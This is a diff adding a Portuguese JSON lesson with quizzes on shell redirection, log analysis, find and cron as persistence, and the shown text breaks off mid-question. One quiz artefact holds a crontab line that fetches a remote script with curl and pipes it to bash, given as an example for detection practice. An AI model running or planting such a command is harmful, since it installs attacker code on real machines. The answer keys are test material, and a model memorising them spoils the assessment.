@@ -1,0 +1,1034 @@
+{
+  "id": "1.2",
+  "nivel": 1,
+  "titulo": "Linha de comando e shell",
+  "objetivos": [
+    "Prever para onde vai cada fluxo ao usar redirecionamento e pipes, incluindo a saída de erro",
+    "Extrair e contar informação de arquivos de log com grep, awk, sed, sort e uniq",
+    "Localizar arquivos com find por nome, permissão e data de modificação",
+    "Automatizar tarefas com script e cron, e reconhecer o agendamento como técnica de persistência"
+  ],
+  "pre_requisitos": ["1.1"],
+  "teoria": [
+    {
+      "id": "1.2.t1",
+      "titulo": "Três fluxos, e a ordem do redirecionamento importa",
+      "texto": "Todo processo nasce com três fluxos: entrada padrão, saída padrão e saída de erro. O sinal > redireciona a saída padrão para um arquivo, >> acrescenta ao fim e 2> redireciona a saída de erro.\n\nA construção 2>&1 significa \"mande o erro para onde a saída padrão está apontando agora\". A palavra agora é o detalhe que derruba quase todo mundo: em comando > arquivo 2>&1 o erro vai para o arquivo; em comando 2>&1 > arquivo o erro continua no terminal, porque no momento em que 2>&1 foi avaliado a saída ainda apontava para lá.\n\nSeparar os dois fluxos é útil: erro no terminal e resultado no arquivo permite acompanhar problemas sem sujar o resultado.",
+      "analogia": "Duas esteiras saindo da mesma máquina. Você escolhe o destino de cada uma, e a ordem em que aperta os botões muda onde a segunda vai parar.",
+      "erro_comum": "Escrever comando 2>&1 > arquivo esperando capturar o erro. O arquivo sai sem os erros, e a falha só aparece quando alguém precisa deles.",
+      "fonte": "POSIX shell; teoria 1.1.t6"
+    },
+    {
+      "id": "1.2.t2",
+      "titulo": "Pipes: ferramentas pequenas em cadeia",
+      "texto": "O caractere | liga a saída de um comando à entrada do seguinte. É a ideia central do ambiente: em vez de um programa que faz tudo, vários programas pequenos encadeados.\n\nUma análise de log costuma ter a mesma forma: filtrar as linhas de interesse, extrair o campo que importa, ordenar, contar repetições e ordenar de novo pela contagem. Cada etapa é um comando simples, e a cadeia inteira cabe em uma linha.\n\nPipes ligam apenas a saída padrão. A saída de erro não entra na cadeia, a menos que você a redirecione de propósito.",
+      "analogia": "Uma linha de montagem: cada estação faz uma coisa só e entrega para a próxima.",
+      "erro_comum": "Esperar que o pipe carregue as mensagens de erro. Elas seguem por fora e aparecem no terminal.",
+      "fonte": "POSIX shell"
+    },
+    {
+      "id": "1.2.t3",
+      "titulo": "grep: encontrar a linha",
+      "texto": "grep filtra linhas que casam com um padrão. Opções que aparecem toda hora: -i ignora maiúsculas e minúsculas, -v inverte e mostra o que não casa, -c conta as linhas casadas em vez de exibi-las, -r percorre diretórios e -n mostra o número da linha.\n\nEm investigação, três usos cobrem quase tudo: procurar um endereço IP em todos os logs, contar quantas vezes um evento aparece, e olhar as linhas em torno de um achado com -A, -B ou -C.\n\ngrep responde \"em quais linhas isso aparece\". Ele não é a ferramenta para recortar um pedaço da linha — isso é trabalho de awk ou cut.",
+      "analogia": "Um marcador de texto: ele destaca a linha inteira, não recorta a palavra.",
+      "erro_comum": "Tentar extrair campo com grep e acabar com a linha inteira. Filtrar e extrair são etapas diferentes da cadeia.",
+      "fonte": "POSIX grep"
+    },
+    {
+      "id": "1.2.t4",
+      "titulo": "Extrair e contar: awk, cut, sort e uniq",
+      "texto": "cut recorta por delimitador fixo: cut -d: -f1 /etc/passwd traz só o nome de cada conta. awk é mais flexível e enxerga cada linha dividida em campos, acessíveis por $1, $2, e assim por diante; NF é o número de campos, então $NF é o último.\n\nA contagem clássica é sort | uniq -c | sort -rn: ordenar para agrupar iguais, contar as repetições e ordenar pela contagem, do maior para o menor. É como se descobre qual endereço tentou mais logins.\n\nUm cuidado: posição fixa de campo só funciona quando todas as linhas têm o mesmo formato. Em logs de autenticação, linhas com \"invalid user\" têm duas palavras a mais, e o campo de número fixo passa a apontar para outra coisa. Contar a partir do fim, com $(NF-3), costuma ser mais estável.",
+      "analogia": "Uma planilha sem cabeçalho: dá para pegar a terceira coluna, desde que todas as linhas tenham o mesmo número de colunas.",
+      "erro_comum": "Confiar no número da coluna sem conferir as variações do formato. O resultado sai misturando nome de usuário com endereço.",
+      "fonte": "POSIX awk; verificado em amostra de /var/log/auth.log"
+    },
+    {
+      "id": "1.2.t5",
+      "titulo": "find: localizar por nome, permissão e tempo",
+      "texto": "find percorre a árvore de diretórios aplicando critérios. Por nome: find /var/log -name \"*.log\". Por permissão: find / -perm -4000 -type f encontra binários com SUID. Por tempo: -mtime -7 traz o que foi modificado nos últimos sete dias, e -mtime +7 o que é mais antigo que isso.\n\nO sinal antes do número é o que muda tudo: menos significa \"há menos tempo que\", mais significa \"há mais tempo que\". Sem sinal, é o dia exato.\n\nEm investigação, find por tempo responde a pergunta mais útil depois de um incidente: o que mudou nesta máquina desde a data em que a suspeita começou.",
+      "analogia": "Uma busca no arquivo morto com três filtros: pelo nome da pasta, pelo carimbo de confidencial e pela data.",
+      "erro_comum": "Trocar -mtime -7 por +7 e concluir que nada mudou. Os dois trazem conjuntos opostos.",
+      "fonte": "POSIX find; comportamento verificado em execução"
+    },
+    {
+      "id": "1.2.t6",
+      "titulo": "Scripts e cron: automação — e persistência",
+      "texto": "Um script é um arquivo de texto com comandos, começando pela linha #!/bin/bash, que indica o interpretador, e com permissão de execução dada por chmod +x.\n\ncron agenda execuções. Cada entrada tem cinco campos de tempo antes do comando: minuto, hora, dia do mês, mês e dia da semana. O asterisco significa qualquer valor, então 0 3 * * * roda às três da manhã, todos os dias.\n\nDo ponto de vista de segurança, agendamento é uma das formas mais comuns de persistência: quem invade cria uma tarefa que reabre o acesso periodicamente, e a máquina reinfecta a si mesma mesmo depois da limpeza. Por isso a revisão de tarefas agendadas entra na triagem de qualquer incidente.",
+      "analogia": "Um despertador que alguém programou na sua casa: continua tocando depois que a pessoa foi embora.",
+      "erro_comum": "Limpar o malware e não olhar as tarefas agendadas. A infecção volta no próximo horário marcado.",
+      "fonte": "crontab(5); MITRE ATT&CK (tarefa agendada como persistência)"
+    }
+  ],
+  "questoes": [
+    {
+      "id": "1.2.q1",
+      "tipo": "comando",
+      "dificuldade": 2,
+      "objetivos": [0],
+      "enunciado": "Qual é a diferença entre `comando > saida.txt 2>&1` e `comando 2>&1 > saida.txt`?",
+      "alternativas": [
+        "No primeiro, erro e resultado vão para o arquivo; no segundo, o erro continua no terminal",
+        "São equivalentes: a ordem dos redirecionamentos não altera o resultado",
+        "No primeiro, apenas o erro vai para o arquivo; no segundo, apenas o resultado",
+        "O segundo é inválido e o shell recusa a execução"
+      ],
+      "correta": 0,
+      "dicas": [
+        "2>&1 significa \"erro vai para onde a saída padrão aponta neste momento\".",
+        "Leia a linha da esquerda para a direita e pergunte para onde a saída padrão aponta em cada ponto.",
+        "No segundo caso, quando o 2>&1 é avaliado, a saída padrão ainda é o terminal."
+      ],
+      "pergunta_socratica": "Antes de conferir: no segundo comando, para onde a saída padrão apontava no instante em que o 2>&1 foi processado?",
+      "explicacao": "O shell processa os redirecionamentos na ordem em que aparecem. No primeiro caso a saída padrão já foi apontada para o arquivo quando 2>&1 é avaliado, então o erro segue junto. No segundo, 2>&1 é avaliado enquanto a saída padrão ainda é o terminal — o erro fica no terminal, e só depois o resultado é desviado para o arquivo. Executando os dois, o arquivo do primeiro sai com a mensagem de erro e o do segundo sai vazio.",
+      "por_que_erradas": {
+        "1": "A ordem é justamente o que determina o destino do erro.",
+        "2": "No primeiro caso os dois fluxos vão para o arquivo; no segundo, só o resultado vai.",
+        "3": "As duas formas são sintaticamente válidas e executam normalmente."
+      },
+      "fonte": "POSIX shell; comportamento verificado em execução",
+      "tags": ["shell", "redirecionamento", "comando", "fundamentos"]
+    },
+    {
+      "id": "1.2.q2",
+      "tipo": "conceitual",
+      "dificuldade": 1,
+      "objetivos": [0],
+      "enunciado": "Qual é a diferença entre `>` e `>>` ao redirecionar a saída de um comando?",
+      "alternativas": [
+        "> sobrescreve o arquivo; >> acrescenta ao final do que já existe",
+        "> grava texto; >> grava dados binários",
+        "> redireciona a saída padrão; >> redireciona a saída de erro",
+        "> funciona apenas com arquivos existentes; >> cria o arquivo se necessário"
+      ],
+      "correta": 0,
+      "dicas": [
+        "Um dos dois apaga o conteúdo anterior sem avisar.",
+        "Pense no que acontece ao rodar o mesmo comando duas vezes.",
+        "Redirecionar a saída de erro usa outro símbolo."
+      ],
+      "pergunta_socratica": "Antes de conferir: você tem um arquivo de log com uma semana de dados e roda um comando com >. O que sobra?",
+      "explicacao": "> trunca o arquivo antes de escrever, apagando o conteúdo anterior sem confirmação. >> acrescenta ao final, preservando o que já estava lá. Em rotina de log a escolha errada destrói histórico, e é um erro que costuma ser descoberto tarde. A saída de erro é redirecionada com 2>, e ambos criam o arquivo se ele não existir.",
+      "por_que_erradas": {
+        "1": "Os dois lidam com qualquer conteúdo; não há distinção entre texto e binário.",
+        "2": "Ambos tratam da saída padrão; a de erro usa 2> ou 2>>.",
+        "3": "Os dois criam o arquivo quando ele não existe."
+      },
+      "fonte": "POSIX shell",
+      "tags": ["shell", "redirecionamento", "fundamentos"]
+    },
+    {
+      "id": "1.2.q3",
+      "tipo": "conceitual",
+      "dificuldade": 2,
+      "objetivos": [0, 1],
+      "enunciado": "Você executa `comando_com_erros | grep \"aviso\"` e as mensagens de erro continuam aparecendo no terminal, sem serem filtradas. Por quê?",
+      "alternativas": [
+        "O pipe liga apenas a saída padrão ao comando seguinte; a saída de erro segue por fora da cadeia",
+        "O grep não consegue processar mensagens de erro, apenas texto comum",
+        "O pipe descarta a saída de erro, e o que aparece no terminal é uma repetição do sistema",
+        "É necessário usar grep -e para que o filtro alcance mensagens de erro"
+      ],
+      "correta": 0,
+      "dicas": [
+        "Quantos fluxos de saída um processo tem, e quantos o pipe carrega?",
+        "Se você quisesse filtrar também os erros, o que precisaria fazer antes do pipe?",
+        "A solução costuma ser 2>&1 antes do pipe."
+      ],
+      "pergunta_socratica": "Antes de conferir: o pipe transporta um fluxo ou dois?",
+      "explicacao": "O pipe conecta somente a saída padrão. A saída de erro continua indo para o terminal, o que é útil no dia a dia — você vê o problema mesmo com a cadeia filtrando o resultado. Para incluir os erros na cadeia é preciso uni-los antes: comando 2>&1 | grep \"aviso\".",
+      "por_que_erradas": {
+        "1": "grep processa qualquer texto; o problema é o erro não chegar até ele.",
+        "2": "O pipe não descarta nada: a saída de erro simplesmente não entra nele.",
+        "3": "A opção -e apenas indica um padrão de busca; não altera quais fluxos chegam ao grep."
+      },
+      "fonte": "POSIX shell; teoria 1.2.t2",
+      "tags": ["shell", "pipes", "redirecionamento", "diagnostico"]
+    },
+    {
+      "id": "1.2.q4",
+      "tipo": "comando",
+      "dificuldade": 1,
+      "objetivos": [1],
+      "enunciado": "Qual comando conta quantas linhas de /var/log/auth.log contêm o texto \"Failed password\"?",
+      "alternativas": [
+        "grep -c \"Failed password\" /var/log/auth.log",
+        "grep -n \"Failed password\" /var/log/auth.log",
+        "grep -v \"Failed password\" /var/log/auth.log",
+        "grep -i \"Failed password\" /var/log/auth.log"
+      ],
+      "correta": 0,
+      "dicas": [
+        "Uma das opções tem a inicial de count.",
+        "Outra inverte a busca e traz o que não casa.",
+        "-n e -i mudam a exibição e a sensibilidade a maiúsculas, não a contagem."
+      ],
+      "pergunta_socratica": "Antes de conferir: você quer ver as linhas ou saber quantas são?",
+      "explicacao": "-c faz o grep devolver o número de linhas que casaram, em vez das linhas. -n numera, -v inverte a seleção e -i ignora maiúsculas e minúsculas. Em uma amostra com quatro tentativas malsucedidas, grep -c devolve exatamente 4 — é a forma mais rápida de medir volume de tentativas antes de investigar o detalhe.",
+      "por_que_erradas": {
+        "1": "-n exibe as linhas com o número de cada uma, sem contar.",
+        "2": "-v traz justamente as linhas que não contêm o texto.",
+        "3": "-i exibe as linhas ignorando maiúsculas, sem contá-las."
+      },
+      "fonte": "POSIX grep; comportamento verificado em execução",
+      "tags": ["shell", "grep", "comando", "logs"]
+    },
+    {
+      "id": "1.2.q5",
+      "tipo": "comando",
+      "dificuldade": 2,
+      "objetivos": [1],
+      "enunciado": "O que faz a cadeia `... | sort | uniq -c | sort -rn`?",
+      "alternativas": [
+        "Agrupa linhas iguais, conta as repetições e ordena da mais frequente para a menos frequente",
+        "Remove todas as linhas duplicadas e ordena o resultado em ordem alfabética",
+        "Conta o total de linhas e exibe apenas o número final",
+        "Ordena as linhas por tamanho e remove as menores"
+      ],
+      "correta": 0,
+      "dicas": [
+        "uniq só agrupa iguais que estejam adjacentes — por isso o primeiro sort.",
+        "A opção -c do uniq acrescenta a contagem na frente de cada linha.",
+        "No segundo sort, -r inverte e -n ordena numericamente."
+      ],
+      "pergunta_socratica": "Antes de conferir: por que existe um sort antes do uniq, se depois vem outro sort?",
+      "explicacao": "uniq compara apenas linhas vizinhas, então o primeiro sort junta as iguais. -c acrescenta a contagem de cada grupo, e o sort -rn final ordena por esse número, do maior para o menor. É a cadeia padrão para responder \"quem apareceu mais vezes\" — por exemplo, qual endereço concentrou as tentativas de login em um log.",
+      "por_que_erradas": {
+        "1": "A ordenação final é por frequência, não alfabética, e as repetições são contadas, não descartadas.",
+        "2": "Isso seria wc -l; a cadeia produz uma contagem por valor distinto.",
+        "3": "Nada nessa cadeia ordena por tamanho nem descarta linhas curtas."
+      },
+      "fonte": "POSIX sort e uniq; comportamento verificado em execução",
+      "tags": ["shell", "pipes", "comando", "analise-de-log"]
+    },
+    {
+      "id": "1.2.q6",
+      "tipo": "caca_erro",
+      "dificuldade": 3,
+      "objetivos": [1],
+      "trecho": "# objetivo: listar os IPs que mais tentaram autenticar sem sucesso\ngrep \"Failed password\" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn\n\n# saída obtida em uma amostra de 4 linhas:\n#      1 203.0.113.45\n#      1 198.51.100.7\n#      1 oracle\n#      1 admin",
+      "enunciado": "A cadeia está sintaticamente correta, mas o resultado mistura nomes de usuário com endereços. Qual é a causa?",
+      "alternativas": [
+        "As linhas com \"invalid user\" têm duas palavras a mais, então o campo 11 aponta para posições diferentes conforme a linha",
+        "O awk não consegue processar endereços IP, apenas texto sem pontos",
+        "O uniq -c está contando errado porque as linhas não foram ordenadas antes",
+        "O grep está filtrando linhas demais e trazendo eventos que não são de falha de senha"
+      ],
+      "correta": 0,
+      "dicas": [
+        "Compare palavra a palavra uma linha com \"invalid user\" e outra sem.",
+        "Posição fixa de campo pressupõe formato idêntico em todas as linhas.",
+        "Contar a partir do fim da linha seria mais estável que contar do começo."
+      ],
+      "pergunta_socratica": "Antes de conferir: escreva as duas variações da linha lado a lado e conte as palavras até o endereço em cada uma.",
+      "explicacao": "Em \"Failed password for root from 198.51.100.7\", o endereço cai em uma posição; em \"Failed password for invalid user admin from 203.0.113.45\", as palavras \"invalid user\" deslocam tudo em duas posições, e o campo 11 passa a apontar para o nome do usuário. A correção é ancorar pelo fim, com $(NF-3), que fica no endereço nos dois formatos — verificado na mesma amostra, devolvendo 3 ocorrências de 203.0.113.45 e 1 de 198.51.100.7. A lição vale além do exemplo: posição fixa de campo só é confiável quando o formato é realmente fixo.",
+      "por_que_erradas": {
+        "1": "awk trata endereços como qualquer outro texto, sem dificuldade.",
+        "2": "O sort está presente antes do uniq -c; a contagem está correta para o que foi extraído.",
+        "3": "O filtro está correto: todas as linhas trazidas são de falha de senha."
+      },
+      "fonte": "POSIX awk; comportamento verificado em amostra de auth.log",
+      "tags": ["shell", "awk", "caca-erro", "analise-de-log", "formato"]
+    },
+    {
+      "id": "1.2.q7",
+      "tipo": "comando",
+      "dificuldade": 2,
+      "objetivos": [1],
+      "enunciado": "O que faz o comando `cut -d: -f1 /etc/passwd`?",
+      "alternativas": [
+        "Exibe o primeiro campo de cada linha, usando dois-pontos como delimitador — ou seja, os nomes das contas",
+        "Remove o primeiro campo de cada linha e exibe o restante",
+        "Exibe apenas a primeira linha do arquivo",
+        "Divide o arquivo em partes de um campo cada e grava em arquivos separados"
+      ],
+      "correta": 0,
+      "dicas": [
+        "-d define o delimitador e -f escolhe o campo.",
+        "No /etc/passwd, o que vem antes do primeiro dois-pontos?",
+        "cut exibe o campo escolhido; ele não remove nem grava arquivos."
+      ],
+      "pergunta_socratica": "Antes de conferir: olhe uma linha de /etc/passwd e diga o que está antes do primeiro dois-pontos.",
+      "explicacao": "cut recorta por delimitador: -d: define os dois-pontos e -f1 seleciona o primeiro campo, que no /etc/passwd é o nome da conta. Executado sobre linhas de root e www-data, devolve exatamente esses dois nomes. É a forma mais direta de listar as contas do sistema para conferir com a lista de pessoas ativas.",
+      "por_que_erradas": {
+        "1": "cut exibe o campo escolhido; para remover existe a opção --complement.",
+        "2": "Exibir a primeira linha seria head -n 1.",
+        "3": "cut não grava arquivos; ele escreve na saída padrão."
+      },
+      "fonte": "POSIX cut; comportamento verificado em execução",
+      "tags": ["shell", "cut", "comando", "usuarios"]
+    },
+    {
+      "id": "1.2.q8",
+      "tipo": "conceitual",
+      "dificuldade": 2,
+      "objetivos": [1],
+      "enunciado": "Em awk, o que representa `$NF`?",
+      "alternativas": [
+        "O último campo da linha",
+        "O número total de campos da linha",
+        "O nome do arquivo que está sendo processado",
+        "O primeiro campo que contém um número"
+      ],
+      "correta": 0,
+      "dicas": [
+        "NF sozinho é a quantidade de campos.",
+        "O cifrão antes de um número devolve o campo daquela posição.",
+        "Se NF vale 12, o que $12 representa?"
+      ],
+      "pergunta_socratica": "Antes de conferir: se NF é a quantidade de campos, o que $NF devolve?",
+      "explicacao": "NF é o número de campos da linha, e o cifrão aplicado a um valor devolve o campo naquela posição — então $NF é o último campo. Daí a utilidade de expressões como $(NF-3), que ancoram pelo fim e resistem a linhas com palavras a mais no começo, situação comum em logs de autenticação.",
+      "por_que_erradas": {
+        "1": "O total de campos é NF, sem o cifrão.",
+        "2": "O nome do arquivo é FILENAME.",
+        "3": "awk não seleciona campo por tipo de conteúdo dessa forma."
+      },
+      "fonte": "POSIX awk",
+      "tags": ["shell", "awk", "vocabulario", "analise-de-log"]
+    },
+    {
+      "id": "1.2.q9",
+      "tipo": "comando",
+      "dificuldade": 2,
+      "objetivos": [2],
+      "enunciado": "Qual comando lista os arquivos com extensão .log em /var/log modificados nos últimos 7 dias?",
+      "alternativas": [
+        "find /var/log -name \"*.log\" -mtime -7",
+        "find /var/log -name \"*.log\" -mtime +7",
+        "find /var/log -name \"*.log\" -mtime 7",
+        "find /var/log -name \"*.log\" -size -7"
+      ],
+      "correta": 0,
+      "dicas": [
+        "O sinal antes do número define o sentido da comparação.",
+        "Menos significa \"há menos tempo que\"; mais significa \"há mais tempo que\".",
+        "-size filtra por tamanho, não por data."
+      ],
+      "pergunta_socratica": "Antes de conferir: você quer o que mudou recentemente ou o que está parado há tempo?",
+      "explicacao": "-mtime -7 traz o que foi modificado há menos de sete dias. Com +7 viria o oposto: o que está sem alteração há mais de sete dias. Sem sinal, seria exatamente o sétimo dia. Testado em um diretório com um arquivo novo e outro de dez dias atrás, -7 traz só o novo e +7 só o antigo. Depois de um incidente, essa é a pergunta mais útil: o que mudou desde a data da suspeita.",
+      "por_que_erradas": {
+        "1": "+7 traz arquivos mais antigos que sete dias, o conjunto oposto.",
+        "2": "Sem sinal, o filtro é o dia exato, e não o intervalo.",
+        "3": "-size filtra por tamanho do arquivo."
+      },
+      "fonte": "POSIX find; comportamento verificado em execução",
+      "tags": ["shell", "find", "comando", "investigacao"]
+    },
+    {
+      "id": "1.2.q10",
+      "tipo": "comando",
+      "dificuldade": 3,
+      "objetivos": [2],
+      "enunciado": "Você quer localizar arquivos graváveis por qualquer usuário em um servidor. Qual comando faz isso?",
+      "alternativas": [
+        "find / -type f -perm -o+w 2>/dev/null",
+        "find / -type f -perm -4000 2>/dev/null",
+        "find / -type f -writable 2>/dev/null",
+        "find / -type f -perm 777 -exec chmod 644 {} \\;"
+      ],
+      "correta": 0,
+      "dicas": [
+        "\"Qualquer usuário\" corresponde ao conjunto others na notação de permissão.",
+        "Uma das opções procura o bit SUID, que é outra coisa.",
+        "-writable responde sobre quem está executando o comando, não sobre todos."
+      ],
+      "pergunta_socratica": "Antes de conferir: qual dos três conjuntos de permissão representa \"todos os demais usuários\"?",
+      "explicacao": "-perm -o+w procura o bit de escrita no conjunto others, ou seja, arquivos que qualquer usuário da máquina pode alterar — exatamente o tipo de achado que permite a um invasor com acesso limitado plantar código. -perm -4000 procura SUID, e -writable testa a permissão de quem executa o comando, o que dá resposta diferente conforme o usuário. A última opção não procura: ela altera permissões em massa, o que pode quebrar o sistema.",
+      "por_que_erradas": {
+        "1": "-4000 procura o bit SUID, não a escrita para todos.",
+        "2": "-writable avalia a permissão do usuário que está rodando o find, não a de todos.",
+        "3": "Além de procurar por permissão exata, esse comando altera arquivos em massa — ação destrutiva, não levantamento."
+      },
+      "fonte": "POSIX find; CIS Benchmarks",
+      "tags": ["shell", "find", "permissoes", "hardening"]
+    },
+    {
+      "id": "1.2.q11",
+      "tipo": "conceitual",
+      "dificuldade": 1,
+      "objetivos": [3],
+      "enunciado": "Para que serve a primeira linha `#!/bin/bash` em um script?",
+      "alternativas": [
+        "Indica ao sistema qual interpretador deve executar o arquivo",
+        "É apenas um comentário, ignorado durante a execução",
+        "Concede permissão de execução automática ao arquivo",
+        "Define o diretório de trabalho onde o script será executado"
+      ],
+      "correta": 0,
+      "dicas": [
+        "A linha começa com # mas tem um significado especial nos dois primeiros caracteres.",
+        "Sem ela, o sistema precisa adivinhar como executar o arquivo.",
+        "Permissão de execução vem de outro lugar."
+      ],
+      "pergunta_socratica": "Antes de conferir: como o sistema saberia que este arquivo de texto deve ser entregue ao bash, e não ao python?",
+      "explicacao": "A sequência #! no início do arquivo indica ao núcleo qual programa deve interpretar o conteúdo. O caminho seguinte é o interpretador — bash, sh, python, o que for. Ela não substitui a permissão de execução, que vem de chmod +x, e não define diretório de trabalho.",
+      "por_que_erradas": {
+        "1": "Apesar do #, essa linha é interpretada pelo núcleo quando está no início do arquivo.",
+        "2": "Permissão de execução é concedida com chmod +x.",
+        "3": "O diretório de trabalho é herdado de quem chamou o script."
+      },
+      "fonte": "POSIX; teoria 1.2.t6",
+      "tags": ["shell", "script", "fundamentos"]
+    },
+    {
+      "id": "1.2.q12",
+      "tipo": "artefato",
+      "dificuldade": 2,
+      "objetivos": [3],
+      "artefato": "# crontab -l  (usuário www-data)\n*/10 * * * * /usr/bin/curl -s http://198.51.100.23/x.sh | /bin/bash\n0 3 * * 0 /usr/local/bin/rotate-logs",
+      "enunciado": "Qual é a leitura correta destas duas entradas de cron?",
+      "alternativas": [
+        "A primeira baixa e executa um script remoto a cada 10 minutos sob o usuário do servidor web — persistência típica de comprometimento; a segunda é uma rotina semanal legítima",
+        "As duas são rotinas de manutenção normais, com frequências diferentes",
+        "A primeira roda uma vez por dia às 10h; a segunda roda todo dia às 3h",
+        "A segunda é a suspeita, porque rodar de madrugada indica tentativa de passar despercebido"
+      ],
+      "correta": 0,
+      "dicas": [
+        "Leia os cinco campos de tempo: minuto, hora, dia do mês, mês, dia da semana.",
+        "O que */10 significa no campo de minuto?",
+        "Pergunte por que um servidor web baixaria e executaria código de um endereço externo."
+      ],
+      "pergunta_socratica": "Antes de conferir: o que acontece com essa máquina 10 minutos depois de você limpar o malware?",
+      "explicacao": "*/10 no campo de minuto significa a cada 10 minutos. A primeira entrada busca um script em um endereço externo e o executa diretamente, sob o usuário do servidor web — é o padrão clássico de persistência: mesmo depois da limpeza, a máquina se reinfecta no próximo ciclo. A segunda roda aos domingos às 3h (dia da semana 0) e tem cara de manutenção legítima. Horário de madrugada, sozinho, não é indício.",
+      "por_que_erradas": {
+        "1": "Baixar e executar código remoto a cada 10 minutos não é manutenção normal.",
+        "2": "*/10 no primeiro campo é a cada 10 minutos, e o último campo da segunda entrada é o dia da semana.",
+        "3": "Rodar de madrugada é comum em rotinas legítimas; o indício está na primeira entrada."
+      },
+      "fonte": "crontab(5); MITRE ATT&CK (tarefa agendada como persistência)",
+      "tags": ["shell", "cron", "artefato", "persistencia", "deteccao"]
+    },
+    {
+      "id": "1.2.q13",
+      "tipo": "conceitual",
+      "dificuldade": 2,
+      "objetivos": [3],
+      "enunciado": "Em uma entrada de cron, qual é a ordem dos cinco campos de tempo?",
+      "alternativas": [
+        "Minuto, hora, dia do mês, mês, dia da semana",
+        "Hora, minuto, dia da semana, dia do mês, mês",
+        "Dia da semana, dia do mês, mês, hora, minuto",
+        "Segundo, minuto, hora, dia do mês, mês"
+      ],
+      "correta": 0,
+      "dicas": [
+        "A ordem vai da menor unidade de tempo para a maior, com uma exceção no fim.",
+        "cron não tem resolução de segundos.",
+        "O último campo é o único que não segue a progressão de tamanho."
+      ],
+      "pergunta_socratica": "Antes de conferir: em `0 3 * * 0`, qual campo vale 3 e qual vale 0 no fim?",
+      "explicacao": "A ordem é minuto, hora, dia do mês, mês e dia da semana. Em 0 3 * * 0, o minuto é 0, a hora é 3, dia do mês e mês são livres, e o dia da semana é 0 — domingo. cron não trabalha com segundos, e trocar a ordem dos dois primeiros campos é um erro comum que faz a tarefa rodar em horário completamente diferente do pretendido.",
+      "por_que_erradas": {
+        "1": "Minuto vem antes de hora, e o dia da semana é o último campo.",
+        "2": "A sequência está invertida.",
+        "3": "cron não tem campo de segundos no formato padrão."
+      },
+      "fonte": "crontab(5)",
+      "tags": ["shell", "cron", "vocabulario", "automacao"]
+    },
+    {
+      "id": "1.2.q14",
+      "tipo": "cenario",
+      "dificuldade": 3,
+      "objetivos": [3],
+      "enunciado": "Depois de remover um malware de um servidor, a infecção reaparece todos os dias no mesmo horário. Qual é a hipótese mais provável?",
+      "alternativas": [
+        "Existe um mecanismo de persistência, como tarefa agendada ou serviço, que reinstala o código periodicamente",
+        "O antivírus está com assinatura desatualizada e não remove o arquivo por completo",
+        "O malware se replica pela rede a partir de outra máquina a cada 24 horas",
+        "O sistema de arquivos está corrompido e restaura versões antigas dos arquivos"
+      ],
+      "correta": 0,
+      "dicas": [
+        "A regularidade do horário é a pista mais forte.",
+        "O que no sistema é capaz de executar algo todo dia no mesmo minuto?",
+        "Replicação pela rede raramente tem horário exato e constante."
+      ],
+      "pergunta_socratica": "Antes de conferir: o que, nesta máquina, tem a capacidade de disparar exatamente no mesmo horário todos os dias?",
+      "explicacao": "Retorno em horário fixo aponta para agendamento — cron do sistema, cron de um usuário, timer do systemd ou serviço habilitado no boot. Reinfecção vinda de outra máquina é possível, mas raramente com horário constante. Por isso a triagem precisa incluir tarefas agendadas e serviços habilitados: limpar o arquivo sem remover o gatilho é enxugar gelo.",
+      "por_que_erradas": {
+        "1": "Assinatura desatualizada explicaria não detectar, não o retorno em horário fixo.",
+        "2": "Replicação pela rede costuma ser irregular no tempo.",
+        "3": "Sistemas de arquivos comuns não restauram versões antigas sozinhos."
+      },
+      "fonte": "MITRE ATT&CK (persistência); NIST SP 800-61",
+      "tags": ["shell", "cron", "persistencia", "resposta-a-incidentes"]
+    },
+    {
+      "id": "1.2.q15",
+      "tipo": "pareamento",
+      "dificuldade": 2,
+      "objetivos": [1, 2],
+      "enunciado": "Ligue cada ferramenta à tarefa para a qual ela é a escolha mais direta.",
+      "pares": [
+        ["grep", "Encontrar as linhas que contêm um endereço IP específico"],
+        ["awk", "Extrair um campo de cada linha e calcular sobre ele"],
+        ["find", "Localizar arquivos por nome, permissão ou data de modificação"],
+        ["uniq -c", "Contar quantas vezes cada valor repetido aparece"],
+        ["sed", "Substituir um trecho de texto em todas as linhas"]
+      ],
+      "dicas": [
+        "Uma ferramenta trabalha sobre a árvore de diretórios, e não sobre o conteúdo das linhas.",
+        "Duas trabalham dentro da linha, mas uma recorta campos e a outra substitui texto.",
+        "A contagem por valor exige entrada ordenada antes."
+      ],
+      "pergunta_socratica": "Antes de conferir: qual dessas você usaria primeiro ao investigar um log grande, e por quê?",
+      "explicacao": "Cada ferramenta responde a uma pergunta diferente: grep seleciona linhas, awk recorta e calcula sobre campos, sed substitui, uniq -c conta repetições e find localiza arquivos. A força do ambiente está em encadeá-las, e a maior parte das análises de log é exatamente essa sequência — filtrar, extrair, ordenar, contar.",
+      "fonte": "POSIX; teoria 1.2.t3, 1.2.t4 e 1.2.t5",
+      "tags": ["shell", "ferramentas", "pareamento", "analise-de-log"]
+    },
+    {
+      "id": "1.2.q16",
+      "tipo": "comando",
+      "dificuldade": 2,
+      "objetivos": [1],
+      "enunciado": "Qual comando mostra as linhas de um log que contêm \"error\", junto com as duas linhas seguintes a cada ocorrência?",
+      "alternativas": [
+        "grep -A 2 \"error\" aplicacao.log",
+        "grep -B 2 \"error\" aplicacao.log",
+        "grep -n 2 \"error\" aplicacao.log",
+        "grep -v 2 \"error\" aplicacao.log"
+      ],
+      "correta": 0,
+      "dicas": [
+        "As opções vêm das palavras after e before.",
+        "Você quer o que veio depois do erro, não antes.",
+        "-n e -v têm outras funções."
+      ],
+      "pergunta_socratica": "Antes de conferir: em um log, a informação que explica um erro costuma vir antes ou depois dele?",
+      "explicacao": "-A traz linhas after, ou seja, posteriores; -B traz as anteriores e -C traz os dois lados. Em análise de log isso é essencial, porque a linha do erro raramente conta a história completa: o contexto ao redor mostra o que o sistema tentou fazer em seguida. -n numera as linhas e -v inverte a seleção.",
+      "por_que_erradas": {
+        "1": "-B mostra as linhas anteriores à ocorrência.",
+        "2": "-n numera as linhas e não recebe quantidade dessa forma.",
+        "3": "-v inverte a busca, mostrando o que não casa."
+      },
+      "fonte": "POSIX grep",
+      "tags": ["shell", "grep", "comando", "analise-de-log"]
+    },
+    {
+      "id": "1.2.q17",
+      "tipo": "conceitual",
+      "dificuldade": 2,
+      "objetivos": [0],
+      "enunciado": "Para que serve `2>/dev/null` no fim de um comando?",
+      "alternativas": [
+        "Descarta as mensagens de erro, mantendo apenas o resultado no terminal",
+        "Descarta o resultado e mantém apenas as mensagens de erro",
